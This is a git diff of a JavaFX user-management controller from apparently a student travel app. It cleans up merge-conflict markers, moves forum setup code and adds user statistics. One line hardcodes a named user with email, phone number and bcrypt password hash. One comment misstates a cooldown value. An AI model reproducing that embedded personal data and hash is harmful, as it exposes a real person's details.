@@ -1,30 +1,12 @@
 package com.wolfs.controllers.user;
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
 import com.google.api.client.auth.oauth2.Credential;
 import com.google.api.services.oauth2.model.Userinfo;
-=======
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-import com.itextpdf.text.*;
-import com.itextpdf.text.pdf.PdfPCell;
-import com.itextpdf.text.pdf.PdfPTable;
-import com.itextpdf.text.pdf.PdfWriter;
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
 import com.wolfs.models.*;
 import com.wolfs.services.*;
 import com.wolfs.utils.GoogleAuthUtil;
 import javafx.animation.*;
+
 import javafx.application.Platform;
 import javafx.beans.property.SimpleStringProperty;
 import javafx.collections.FXCollections;
@@ -32,7 +14,12 @@ import javafx.collections.ObservableList;
 import javafx.fxml.FXML;
 import javafx.geometry.Insets;
 import javafx.geometry.Pos;
+import javafx.scene.chart.PieChart;
 import javafx.scene.control.*;
+import javafx.scene.control.Button;
+import javafx.scene.control.Dialog;
+import javafx.scene.control.Label;
+import javafx.scene.control.TextField;
 import javafx.scene.control.cell.PropertyValueFactory;
 import javafx.scene.control.cell.TextFieldTableCell;
 import javafx.scene.image.Image;
@@ -43,6 +30,7 @@ import javafx.scene.layout.AnchorPane;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
 import javafx.scene.layout.VBox;
+import javafx.scene.paint.Color;
 import javafx.scene.shape.Circle;
 import javafx.scene.text.Text;
 import javafx.stage.FileChooser;
@@ -55,7 +43,6 @@ import javafx.util.converter.IntegerStringConverter;
 import org.mindrot.jbcrypt.BCrypt;
 
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.security.SecureRandom;
 import java.sql.*;
@@ -65,54 +52,16 @@ import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 import java.time.format.DateTimeParseException;
 import java.util.*;
-import java.util.List;
 
 
 public class CrudUser {
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    private Timeline timeline;
+    //NewNajdForumVar
 
-@FXML
-private Label countdownLabel;
+    private User CurrentUser = new Client(19, "dhieb", "aymen", "aymen.dhieb@esprit.tn", "$2a$10$S67nBnlNHPHqUnTI0.WyDO2OxX2q8X4ZiCRyAPVFgJDLxLwLIhlv.", 56252246, 2, 0, "file:/C:/9raya/java/Projet_Pidev/target/classes/images//aymen.jpg");
 
     @FXML
-    private AnchorPane forget_password;
-    @FXML
-    private TextField forget_password_mail;
-    @FXML
-    private AnchorPane forget_password_reset;
-    @FXML
-    private AnchorPane RederictToLogin;
-
-    private String codeEnvoye;
-    @FXML
-    private TextField code_field;
-    @FXML
-    private PasswordField password_field_reset;
-    @FXML
-    private PasswordField confirmer_password_field_reset;
-
-    private final ClientServices ClientService_user = new ClientServices();
-
-
-    /*********************NEWWWWWWWWWWWWWWWWWWWWW********************************/
-
-=======
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-    //new aymen
-    @FXML
-    private ComboBox<String> page_hotel_combo_chercher;
-    @FXML
-    private TextField page_hotel_chercher;
-
-    //new
-    //----------------------------najdForum----------------------------------------------------------------------------
+    private TextField ChercherForum;
 
     @FXML
     private TextField nameField;
@@ -151,6 +100,9 @@ private Label countdownLabel;
     private TableColumn<Forum, LocalDateTime> dateColumn;
     @FXML
     private TableColumn<Forum, Boolean> privateColumn;
+    @FXML
+    private TableColumn<Forum, String> listMembersColumn;
+
 
     private ObservableList<Forum> forumList = FXCollections.observableArrayList();
 
@@ -267,24 +219,54 @@ private Label countdownLabel;
     private ChoixService choixService = new ChoixService();
 
     private Post currentPost;
-//NewNajdForumI
-private Map<String, Long> userLastPostTime = new HashMap<>(); // Store user's last post time
-private static final long POST_COOLDOWN = 60000; // 1 minute cooldown in milliseconds
-@FXML private TabPane rightTabPane;
+
+    private Map<String, Long> userLastPostTime = new HashMap<>(); // Store user's last post time
+    private static final long POST_COOLDOWN = 1500; // 1 minute cooldown in milliseconds
+    @FXML private TabPane rightTabPane;
+
+    //finNAJD
+
+    @FXML
+    private Label nonBloquer_label;
+    @FXML
+    private Label bloquer_label;
+
+    @FXML
+    private Label count_client;
+    @FXML
+    private Label count_bloque;
+
+    @FXML
+    private PieChart ChatStatus;
+
+    private Timeline timeline;
+
+    @FXML
+    private Label countdownLabel;
+
+    @FXML
+    private AnchorPane forget_password;
+    @FXML
+    private TextField forget_password_mail;
+    @FXML
+    private AnchorPane forget_password_reset;
+    @FXML
+    private AnchorPane RederictToLogin;
 
 
+    private String codeEnvoye;
+    @FXML
+    private TextField code_field;
+    @FXML
+    private PasswordField password_field_reset;
+    @FXML
+    private PasswordField confirmer_password_field_reset;
 
-//////////////////////////////////////////////////////////////////////////
+    private final ClientServices ClientService_user = new ClientServices();
 
 
-    //old
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
+    /*********************NEWWWWWWWWWWWWWWWWWWWWW********************************/
+
     @FXML
     private AnchorPane Modifier_page;
     @FXML
@@ -730,8 +712,7 @@ private static final long POST_COOLDOWN = 60000; // 1 minute cooldown in millise
     @FXML
     private TableColumn<Client, Integer> cl_user_num_tel;
 
-    @FXML
-    private TableColumn<Client, String> cl_user_photo;
+
 
     @FXML
     private TableColumn<Client, String> cl_user_prenom;
@@ -887,237 +868,10 @@ private TableView<Vol> tableViewVols;
 
 
 
-
-
-
-
-
     private boolean isPasswordVisible = false;
-
-
 
     public void initialize() {
         startAnimation();
-
-
-        //new aymen
-        page_hotel_combo_chercher.setItems(FXCollections.observableArrayList(
-                "nom_hotel",
-                "num_telephone_hotel",
-                "email_hotel"
-        ));
-
-
-        //new
-        { //najdForumI
-            //--------------------------------------------------------------------------------------------------------
-            {
-                forumTableView.setEditable(true);
-
-                forumIdColumn.setCellValueFactory(new PropertyValueFactory<>("forumId"));
-
-                nameColumn.setCellValueFactory(new PropertyValueFactory<>("name"));
-                nameColumn.setCellFactory(TextFieldTableCell.forTableColumn());
-                nameColumn.setOnEditCommit(this::onNameEdit);
-
-                createdByColumn.setCellValueFactory(cellData -> {
-                    int userId = cellData.getValue().getCreatedBy();
-                    String email = forumService.getEmailById(userId);
-                    return new SimpleStringProperty(email);
-                });
-                createdByColumn.setCellFactory(TextFieldTableCell.forTableColumn());
-                createdByColumn.setOnEditCommit(event -> {
-                    Forum forum = event.getRowValue();
-                    if (validateTableEdit(forum, "createdBy", event.getNewValue())) {
-                        int userId = forumService.getUserByEmail(event.getNewValue());
-                        forum.setCreatedBy(userId);
-                        updateForum(forum);
-                    }
-                });
-
-                postCountColumn.setCellValueFactory(new PropertyValueFactory<>("postCount"));
-                postCountColumn.setCellFactory(TextFieldTableCell.forTableColumn(new IntegerStringConverter()));
-                postCountColumn.setOnEditCommit(this::onPostCountEdit);
-
-                membersColumn.setCellValueFactory(cellData -> {
-                    Forum forum = cellData.getValue();
-                    if (!forum.isPrivate()) {
-                        return new SimpleStringProperty("Public Forum");
-                    }
-                    String members = forum.getListMembers();
-                    if (members == null || members.isEmpty()) {
-                        return new SimpleStringProperty("No members");
-                    }
-                    return new SimpleStringProperty(members.replace(",", "\n"));
-                });
-                membersColumn.setCellFactory(tc -> {
-                    TableCell<Forum, String> cell = new TableCell<>() {
-                        private final Text text = new Text();
-
-                        {
-                            setGraphic(text);
-                            setPrefHeight(Control.USE_COMPUTED_SIZE);
-                            text.wrappingWidthProperty().bind(widthProperty());
-                        }
-
-                        @Override
-                        protected void updateItem(String item, boolean empty) {
-                            super.updateItem(item, empty);
-                            text.setText(empty ? null : item);
-                        }
-                    };
-                    return cell;
-                });
-                membersColumn.setEditable(false);
-
-                descriptionColumn.setCellValueFactory(new PropertyValueFactory<>("description"));
-                descriptionColumn.setCellFactory(TextFieldTableCell.forTableColumn());
-                descriptionColumn.setOnEditCommit(this::onDescriptionEdit);
-
-                dateColumn.setCellValueFactory(new PropertyValueFactory<>("dateCreation"));
-
-                privateColumn.setCellValueFactory(new PropertyValueFactory<>("private"));
-                privateColumn.setCellFactory(TextFieldTableCell.forTableColumn(new BooleanStringConverter()));
-                privateColumn.setOnEditCommit(event -> {
-                    Forum forum = event.getRowValue();
-                    forum.setPrivate(event.getNewValue());
-                    if (!event.getNewValue()) {
-                        forum.setListMembers("");
-                        forum.setNbrMembers(0);
-                    }
-                    updateForum(forum);
-                });
-
-                addButtonsToTable();
-
-                refreshTableFB();
-
-                addForumButton.setOnAction(event -> addForum());
-                isPrivateCheckBox.setOnAction(event -> handlePrivateCheckbox());
-                addMemberButton.setOnAction(event -> addMember());
-
-                nameField.textProperty().addListener((observable, oldValue, newValue) -> validateName(newValue));
-                createdByField.textProperty().addListener((observable, oldValue, newValue) -> validateEmail(newValue));
-                descriptionField.textProperty().addListener((observable, oldValue, newValue) -> validateDescription(newValue));
-                memberEmailField.textProperty().addListener((observable, oldValue, newValue) -> validateMemberEmail(newValue));
-
-                nameErrorLabel.setVisible(false);
-                emailErrorLabel.setVisible(false);
-                descriptionErrorLabel.setVisible(false);
-                memberEmailErrorLabel.setVisible(false);
-            }
-
-            {
-                postTypeComboBox.getItems().addAll("Announcement", "Survey");
-                postTypeComboBox.setOnAction(e -> handlePostTypeChange());
-
-                loadForums();
-
-                forumComboBox.setOnAction(e -> updateForumInfo());
-
-                setupValidationListeners();
-
-                refreshPosts();
-
-
-                choiceField.textProperty().addListener((obs, old, newValue) ->
-                        validateChoice(newValue));
-
-                announcementStatusComboBox.setValue("active");
-                surveyStatusComboBox.setValue("active");
-
-                surveyUserField.textProperty().addListener((obs, old, newValue) ->
-                        validateSurveyUser(newValue));
-
-                editChoiceField.textProperty().addListener((obs, old, newValue) ->
-                        validateEditChoice(newValue));
-                editSurveyUserField.textProperty().addListener((obs, old, newValue) ->
-                        validateEditSurveyUser(newValue));
-                editAnnouncementTitleField.textProperty().addListener((obs, old, newValue) ->
-                        validateEditTitle(newValue));
-                editAnnouncementContentField.textProperty().addListener((obs, old, newValue) ->
-                        validateEditContent(newValue));
-                editSurveyQuestionField.textProperty().addListener((obs, old, newValue) ->
-                        validateEditQuestion(newValue));
-
-                editChoicesListView.setOnContextMenuRequested(e -> {
-                    if (editChoicesListView.getSelectionModel().getSelectedItem() != null) {
-                        ContextMenu menu = new ContextMenu();
-                        MenuItem removeItem = new MenuItem("Remove");
-                        removeItem.setOnAction(event ->
-                                editChoicesListView.getItems().remove(
-                                        editChoicesListView.getSelectionModel().getSelectedItem()
-                                )
-                        );
-                        menu.getItems().add(removeItem);
-                        menu.show(editChoicesListView, e.getScreenX(), e.getScreenY());
-                    }
-                });
-
-                editSurveyUsersListView.setOnContextMenuRequested(e -> {
-                    if (editSurveyUsersListView.getSelectionModel().getSelectedItem() != null) {
-                        ContextMenu menu = new ContextMenu();
-                        MenuItem removeItem = new MenuItem("Remove");
-                        removeItem.setOnAction(event ->
-                                editSurveyUsersListView.getItems().remove(
-                                        editSurveyUsersListView.getSelectionModel().getSelectedItem()
-                                )
-                        );
-                        menu.getItems().add(removeItem);
-                        menu.show(editSurveyUsersListView, e.getScreenX(), e.getScreenY());
-                    }
-                });
-
-                announcementUserField.textProperty().addListener((obs, old, newValue) ->
-                        validateUserEmail(announcementUserField, announcementUserErrorLabel, newValue));
-                surveyAuthorField.textProperty().addListener((obs, old, newValue) ->
-                        validateUserEmail(surveyAuthorField, surveyAuthorErrorLabel, newValue));
-                editAnnouncementUserField.textProperty().addListener((obs, old, newValue) ->
-                        validateUserEmail(editAnnouncementUserField, editAnnouncementUserErrorLabel, newValue));
-                editSurveyAuthorField.textProperty().addListener((obs, old, newValue) ->
-                        validateUserEmail(editSurveyAuthorField, editSurveyAuthorErrorLabel, newValue));
-
-
-                forumComboBox.valueProperty().addListener((obs, oldVal, newVal) -> {
-                    addPostButton.setDisable(newVal == null);
-                });
-
-                announcementTagsField.textProperty().addListener((obs, old, newValue) ->
-                        validateTags(newValue, tagsErrorLabel));
-
-                surveyTagsField.textProperty().addListener((obs, old, newValue) ->
-                        validateTags(newValue, surveyTagsErrorLabel));
-
-                editAnnouncementTagsField.textProperty().addListener((obs, old, newValue) ->
-                        validateEditTags(newValue, editTagsErrorLabel));
-
-                editSurveyTagsField.textProperty().addListener((obs, old, newValue) ->
-                        validateEditTags(newValue, editSurveyTagsErrorLabel));
-
-                List<TextInputControl> fields = Arrays.asList(
-                        announcementTitleField, announcementContentField, announcementTagsField,
-                        surveyQuestionField, surveyTagsField, choiceField, surveyUserField,
-                        editAnnouncementTitleField, editAnnouncementContentField, editAnnouncementTagsField,
-                        editSurveyQuestionField, editSurveyTagsField, editChoiceField, editSurveyUserField
-                );
-
-                for (TextInputControl field : fields) {
-                    field.focusedProperty().addListener((obs, wasFocused, isNowFocused) -> {
-                        if (!isNowFocused && !field.getStyleClass().contains("valid-fieldFP")
-                                && !field.getStyleClass().contains("text-field-errorFP")) {
-                            field.getStyleClass().add("text-field-errorFP");
-                        }
-                    });
-                }
-            }
-
-            //--------------------------------------------------------------------------------------------------------
-        }
-
-
-
-
-        //old
         chambre_type.setItems(FXCollections.observableArrayList(
                 "Standard",
                 "Deluxe",
@@ -1254,7 +1008,7 @@ private TableView<Vol> tableViewVols;
 
 
 
-        setCircularImage("images//user_icon_001.jpg");
+        setCircularImage("images/user_icon_001.jpg");
 
          photo_profile_signin.setOnMouseClicked(this::handleImageClick);
 
@@ -1943,47 +1697,72 @@ private TableView<Vol> tableViewVols;
 
 
         //tableView USER Back
+
         cl_user_nom.setCellValueFactory(new PropertyValueFactory<>("name"));
         cl_user_prenom.setCellValueFactory(new PropertyValueFactory<>("prenom"));
         cl_user_mail.setCellValueFactory(new PropertyValueFactory<>("email"));
         cl_user_num_tel.setCellValueFactory(new PropertyValueFactory<>("num_tel"));
         cl_user_status.setCellValueFactory(new PropertyValueFactory<>("status"));
+        cl_user_status.setCellFactory(col -> new TableCell<Client, Integer>() {
+            @Override
+            protected void updateItem(Integer status, boolean empty) {
+                super.updateItem(status, empty);
+                if (empty) {
+                    setText(null);
+                    setStyle("");
+                } else {
+                    // Vérifier le statut
+                    if (status != null) {
+                        if (status == 0) {
+                            setText("Active");
+                            setStyle("-fx-text-fill: green;"); // Couleur verte pour "Active"
+                        } else if (status == 1) {
+                            setText("Bloqué");
+                            setStyle("-fx-text-fill: red;"); // Couleur rouge pour "Bloqué"
+                        }
+                    }
+                }
+            }
+        });
         cl_user_bloquer.setCellFactory(column -> {
             return new TableCell<Client, Void>() {
-                private final Button btn = new Button("Bloquer");
-
+                private final Button btn = new Button();
+                private final ImageView imageView = new ImageView(new Image("/images/bloquer.png")); // Chemin de l'image
+                private final HBox hbox = new HBox(btn);
 
                 {
-                    HBox hbox = new HBox(btn);
+                    // Configuration de l'image
+                    imageView.setFitWidth(40);
+                    imageView.setFitHeight(40);
+
+                    btn.setGraphic(imageView);
+
                     hbox.setAlignment(Pos.CENTER);
                     setGraphic(hbox);
+
                     btn.setStyle(
-                            "-fx-background-color: #E78D1E; " +
+                            "-fx-background-color:transparent; " +
                                     "-fx-text-fill: white; " +
                                     "-fx-font-size: 14px; " +
                                     "-fx-border-radius: 5px; " +
                                     "-fx-cursor: hand;"
                     );
 
-
                     btn.setOnAction(event -> {
-                        Client Cl = getTableView().getItems().get(getIndex());
+                        Client client = getTableView().getItems().get(getIndex());
 
                         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
                         alert.setTitle("Confirmation de Bloquer");
-                        alert.setHeaderText("Voulez-vous vraiment vous Bloquer  ? " + Cl.getName() + " " + Cl.getPrenom());
+                        alert.setHeaderText("Voulez-vous vraiment bloquer " + client.getName() + " " + client.getPrenom() + " ?");
                         alert.setContentText("Cliquez sur OK pour confirmer.");
 
                         Optional<ButtonType> result = alert.showAndWait();
 
                         if (result.isPresent() && result.get() == ButtonType.OK) {
-                            ClientServices CL1 = new ClientServices();
-                            CL1.bloquer_client(CL1.getUserIdByEmail(Cl.getEmail()));
+                            ClientServices clientServices = new ClientServices();
+                            clientServices.bloquer_client(clientServices.getUserIdByEmail(client.getEmail()));
                             RefreshTableView_User();
-
                         }
-
-
                     });
                 }
 
@@ -1993,52 +1772,50 @@ private TableView<Vol> tableViewVols;
                     if (empty) {
                         setGraphic(null);
                     } else {
-                        setGraphic(btn);
-                        HBox hbox = new HBox(btn);
-                        hbox.setAlignment(Pos.CENTER);
                         setGraphic(hbox);
                     }
                 }
             };
         });
-
 
         cl_user_debloquer.setCellFactory(column -> {
             return new TableCell<Client, Void>() {
-                private final Button btn = new Button("Debloquer");
-
+                private final Button btn = new Button();
+                private final ImageView imageView = new ImageView(new Image("/images/debloque.png")); // Chemin de l'image
+                private final HBox hbox = new HBox(btn);
 
                 {
-                    HBox hbox = new HBox(btn);
+                    imageView.setFitWidth(40);
+                    imageView.setFitHeight(40);
+
+                    btn.setGraphic(imageView);
+
                     hbox.setAlignment(Pos.CENTER);
                     setGraphic(hbox);
+
                     btn.setStyle(
-                            "-fx-background-color: #E78D1E; " +
+                            "-fx-background-color: transparent; " +
                                     "-fx-text-fill: white; " +
                                     "-fx-font-size: 14px; " +
                                     "-fx-border-radius: 5px; " +
                                     "-fx-cursor: hand;"
                     );
 
-
                     btn.setOnAction(event -> {
-                        Client Cl = getTableView().getItems().get(getIndex());
+                        Client client = getTableView().getItems().get(getIndex());
 
                         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
-                        alert.setTitle("Confirmation de debloquer");
-                        alert.setHeaderText("Voulez-vous vraiment vous debloquer  ? " + Cl.getName() + " " + Cl.getPrenom());
+                        alert.setTitle("Confirmation de Débloquer");
+                        alert.setHeaderText("Voulez-vous vraiment débloquer " + client.getName() + " " + client.getPrenom() + " ?");
                         alert.setContentText("Cliquez sur OK pour confirmer.");
 
                         Optional<ButtonType> result = alert.showAndWait();
 
                         if (result.isPresent() && result.get() == ButtonType.OK) {
-                            ClientServices CL1 = new ClientServices();
-                            CL1.debloquer_client(CL1.getUserIdByEmail(Cl.getEmail()));
+                            ClientServices clientServices = new ClientServices();
+                            clientServices.debloquer_client(clientServices.getUserIdByEmail(client.getEmail()));
                             RefreshTableView_User();
-
                         }
-
-
                     });
                 }
 
@@ -2048,51 +1825,53 @@ private TableView<Vol> tableViewVols;
                     if (empty) {
                         setGraphic(null);
                     } else {
-                        setGraphic(btn);
-                        HBox hbox = new HBox(btn);
-                        hbox.setAlignment(Pos.CENTER);
                         setGraphic(hbox);
                     }
                 }
             };
         });
-
         cl_user_supprimer.setCellFactory(column -> {
             return new TableCell<Client, Void>() {
-                private final Button btn = new Button("Supprimer");
-
+                private final Button btn = new Button();
+                private final ImageView imageView = new ImageView(new Image("/images/supprimer.png"));
+                private final HBox hbox = new HBox(btn);
 
                 {
-                    HBox hbox = new HBox(btn);
+                    imageView.setFitWidth(40);
+                    imageView.setFitHeight(40);
+
+                    btn.setGraphic(imageView);
+
                     hbox.setAlignment(Pos.CENTER);
                     setGraphic(hbox);
+
                     btn.setStyle(
-                            "-fx-background-color: #E78D1E; " +
+                            "-fx-background-color: transparent; " +
                                     "-fx-text-fill: white; " +
                                     "-fx-font-size: 14px; " +
                                     "-fx-border-radius: 5px; " +
                                     "-fx-cursor: hand;"
                     );
 
-
+                    // Gestion de l'action du bouton
                     btn.setOnAction(event -> {
-                        Client Cl = getTableView().getItems().get(getIndex());
+                        Client client = getTableView().getItems().get(getIndex());
 
                         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
                         alert.setTitle("Confirmation de Suppression");
-                        alert.setHeaderText("Voulez-vous vraiment vous supprimer  ? " + Cl.getName() + " " + Cl.getPrenom());
+                        alert.setHeaderText("Voulez-vous vraiment supprimer " + client.getName() + " " + client.getPrenom() + " ?");
                         alert.setContentText("Cliquez sur OK pour confirmer.");
 
                         Optional<ButtonType> result = alert.showAndWait();
 
                         if (result.isPresent() && result.get() == ButtonType.OK) {
-                            ClientServices ClientService = new ClientServices();
-                            Client C1 = new Client(ClientService.getUserIdByEmail(Cl.getEmail()), "", "", "", "", 0, 0, 0, "");
-                            ClientService.supprimerUser(C1);
+                            ClientServices clientServices = new ClientServices();
+                            Client clientToDelete = new Client(
+                                    clientServices.getUserIdByEmail(client.getEmail()), "", "", "", "", 0, 0, 0, ""
+                            );
+                            clientServices.supprimerUser(clientToDelete);
                             RefreshTableView_User();
                         }
-
-
                     });
                 }
 
@@ -2102,19 +1881,16 @@ private TableView<Vol> tableViewVols;
                     if (empty) {
                         setGraphic(null);
                     } else {
-                        setGraphic(btn);
-                        HBox hbox = new HBox(btn);
-                        hbox.setAlignment(Pos.CENTER);
                         setGraphic(hbox);
                     }
                 }
             };
         });
-
 
         ClientServices ClS = new ClientServices();
         List<Client> ClientList = ClS.rechercherUser();
         ObservableList<Client> observableClientList = FXCollections.observableArrayList(ClientList);
+
 
         TableView_Utilisateur.setItems(observableClientList);
 
@@ -2343,8 +2119,296 @@ private TableView<Vol> tableViewVols;
         });
 
         refreshTable();
+        //NEWWWW
+        refreshData();
+
+        { //najdForumI
+            //--------------------------------------------------------------------------------------------------------
+            {
+                forumTableView.setEditable(true);
+
+                forumIdColumn.setCellValueFactory(new PropertyValueFactory<>("forumId"));
+
+                nameColumn.setCellValueFactory(new PropertyValueFactory<>("name"));
+                nameColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                nameColumn.setOnEditCommit(this::onNameEdit);
+
+                createdByColumn.setCellValueFactory(cellData -> {
+                    int userId = cellData.getValue().getCreatedBy();
+                    String email = forumService.getEmailById(userId);
+                    return new SimpleStringProperty(email);
+                });
+                createdByColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                createdByColumn.setOnEditCommit(event -> {
+                    Forum forum = event.getRowValue();
+                    if (validateTableEdit(forum, "createdBy", event.getNewValue())) {
+                        int userId = forumService.getUserByEmail(event.getNewValue());
+                        forum.setCreatedBy(userId);
+                        updateForum(forum);
+                    }
+                });
+
+                postCountColumn.setCellValueFactory(new PropertyValueFactory<>("postCount"));
+                postCountColumn.setCellFactory(TextFieldTableCell.forTableColumn(new IntegerStringConverter()));
+                postCountColumn.setOnEditCommit(this::onPostCountEdit);
+                membersColumn.setCellValueFactory(cellData -> {
+                    Forum forum = cellData.getValue();
+                    if (forum.isPrivate()) {
+
+                        return new SimpleStringProperty(forum.getNbrMembers()+" Members");
+                    }
+                    return new SimpleStringProperty("Private Forum");
+                });
+                membersColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                membersColumn.setEditable(false);
+
+                descriptionColumn.setCellValueFactory(new PropertyValueFactory<>("description"));
+                descriptionColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                descriptionColumn.setOnEditCommit(this::onDescriptionEdit);
+
+                dateColumn.setCellValueFactory(new PropertyValueFactory<>("dateCreation"));
+
+                privateColumn.setCellValueFactory(new PropertyValueFactory<>("private"));
+                privateColumn.setCellFactory(TextFieldTableCell.forTableColumn(new BooleanStringConverter()));
+                privateColumn.setOnEditCommit(event -> {
+                    Forum forum = event.getRowValue();
+                    forum.setPrivate(event.getNewValue());
+                    if (!event.getNewValue()) {
+                        forum.setListMembers("");
+                        forum.setNbrMembers(0);
+                    }
+                    updateForum(forum);
+                });
+
+                listMembersColumn.setCellValueFactory(new PropertyValueFactory<>("listMembers"));
+                listMembersColumn.setCellFactory(TextFieldTableCell.forTableColumn());
+                listMembersColumn.setOnEditCommit(event -> {
+                    Forum forum = event.getRowValue();
+                    String newValue = event.getNewValue();
+
+                    if (validateTableEdit(forum, "listMembers", newValue)) {
+                        CrudUser crudUser = new CrudUser();
+
+                        String[] emails = newValue.split(",");
+                        boolean allValid = Arrays.stream(emails)
+                                .map(String::trim)
+                                .allMatch(crudUser::validateUserEmail2);
+
+                        if (allValid) {
+                            forum.setListMembers(newValue);
+                            forum.setNbrMembers((int) Arrays.stream(emails).count());
+                            updateForum(forum);
+                        } else {
+                            refreshTableFB();
+                        }
+                    }
+                });
+
+                addButtonsToTable();
+
+                refreshTableFB();
+                refreshForums();
+
+                addForumButton.setOnAction(event -> addForum());
+                isPrivateCheckBox.setOnAction(event -> handlePrivateCheckbox());
+                addMemberButton.setOnAction(event -> addMember());
+
+                nameField.textProperty().addListener((observable, oldValue, newValue) -> validateName(newValue));
+                createdByField.textProperty().addListener((observable, oldValue, newValue) -> validateEmail(newValue));
+                descriptionField.textProperty().addListener((observable, oldValue, newValue) -> validateDescription(newValue));
+                memberEmailField.textProperty().addListener((observable, oldValue, newValue) -> validateMemberEmail(newValue));
+                ChercherForum.textProperty().addListener((observable, oldValue, newValue) -> refreshTableFB(newValue));
+
+                nameErrorLabel.setVisible(false);
+                emailErrorLabel.setVisible(false);
+                descriptionErrorLabel.setVisible(false);
+                memberEmailErrorLabel.setVisible(false);
+            }
+
+            {
+                postTypeComboBox.getItems().addAll("Announcement", "Survey");
+                postTypeComboBox.setOnAction(e -> handlePostTypeChange());
+
+                loadForums();
+
+                forumComboBox.setOnAction(e -> updateForumInfo());
+
+                setupValidationListeners();
+
+                refreshPosts();
+
+                choiceField.textProperty().addListener((obs, old, newValue) ->
+                        validateChoice(newValue));
+
+                announcementStatusComboBox.setValue("active");
+                surveyStatusComboBox.setValue("active");
+
+                surveyUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateSurveyUser(newValue));
+
+                editChoiceField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditChoice(newValue));
+                editSurveyUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditSurveyUser(newValue));
+                editAnnouncementTitleField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditTitle(newValue));
+                editAnnouncementContentField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditContent(newValue));
+                editSurveyQuestionField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditQuestion(newValue));
+
+                editChoicesListView.setOnContextMenuRequested(e -> {
+                    if (editChoicesListView.getSelectionModel().getSelectedItem() != null) {
+                        ContextMenu menu = new ContextMenu();
+                        MenuItem removeItem = new MenuItem("Remove");
+                        removeItem.setOnAction(event ->
+                                editChoicesListView.getItems().remove(
+                                        editChoicesListView.getSelectionModel().getSelectedItem()
+                                )
+                        );
+                        menu.getItems().add(removeItem);
+                        menu.show(editChoicesListView, e.getScreenX(), e.getScreenY());
+                    }
+                });
+
+                editSurveyUsersListView.setOnContextMenuRequested(e -> {
+                    if (editSurveyUsersListView.getSelectionModel().getSelectedItem() != null) {
+                        ContextMenu menu = new ContextMenu();
+                        MenuItem removeItem = new MenuItem("Remove");
+                        removeItem.setOnAction(event ->
+                                editSurveyUsersListView.getItems().remove(
+                                        editSurveyUsersListView.getSelectionModel().getSelectedItem()
+                                )
+                        );
+                        menu.getItems().add(removeItem);
+                        menu.show(editSurveyUsersListView, e.getScreenX(), e.getScreenY());
+                    }
+                });
+
+                announcementUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(announcementUserField, announcementUserErrorLabel, newValue));
+                surveyAuthorField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(surveyAuthorField, surveyAuthorErrorLabel, newValue));
+                editAnnouncementUserField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(editAnnouncementUserField, editAnnouncementUserErrorLabel, newValue));
+                editSurveyAuthorField.textProperty().addListener((obs, old, newValue) ->
+                        validateUserEmail(editSurveyAuthorField, editSurveyAuthorErrorLabel, newValue));
+                ChercherForum.textProperty().addListener((observable, oldValue, newValue) -> {
+                    refreshTableFB(newValue);
+                });
+
+                forumComboBox.valueProperty().addListener((obs, oldVal, newVal) -> {
+                    addPostButton.setDisable(newVal == null);
+                });
+
+                announcementTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateTags(newValue, tagsErrorLabel));
+
+                surveyTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateTags(newValue, surveyTagsErrorLabel));
+
+                editAnnouncementTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditTags(newValue, editTagsErrorLabel));
+
+                editSurveyTagsField.textProperty().addListener((obs, old, newValue) ->
+                        validateEditTags(newValue, editSurveyTagsErrorLabel));
+
+                List<TextInputControl> fields = Arrays.asList(
+                        announcementTitleField, announcementContentField, announcementTagsField,
+                        surveyQuestionField, surveyTagsField, choiceField, surveyUserField,
+                        editAnnouncementTitleField, editAnnouncementContentField, editAnnouncementTagsField,
+                        editSurveyQuestionField, editSurveyTagsField, editChoiceField, editSurveyUserField
+                );
+
+                for (TextInputControl field : fields) {
+                    field.focusedProperty().addListener((obs, wasFocused, isNowFocused) -> {
+                        if (!isNowFocused && !field.getStyleClass().contains("valid-fieldFP")
+                                && !field.getStyleClass().contains("text-field-errorFP")) {
+                            field.getStyleClass().add("text-field-errorFP");
+                        }
+                    });
+                }
+            }
+            //--------------------------------------------------------------------------------------------------------
+        }
+
 
     }
+
+
+    //NEWWWWWWWWWWWW
+
+
+    public void refreshData() {
+        ClientServices C1 = new ClientServices();
+        int blockedUsers = C1.UserAccountBlocked();
+        int notBlockedUsers = C1.UserAccountNotBlocked();
+        int totalUsers = blockedUsers + notBlockedUsers;
+
+        count_client.setText(String.valueOf(C1.CountUsers()));
+        count_bloque.setText(String.valueOf(blockedUsers));
+
+        double blockedPercentage = (blockedUsers / (double) totalUsers) * 100;
+        double notBlockedPercentage = (notBlockedUsers / (double) totalUsers) * 100;
+
+        bloquer_label.setText("Bloqués: " + String.format("%.1f", blockedPercentage) + "%");
+        nonBloquer_label.setText("Non Bloqués: " + String.format("%.1f", notBlockedPercentage) + "%");
+
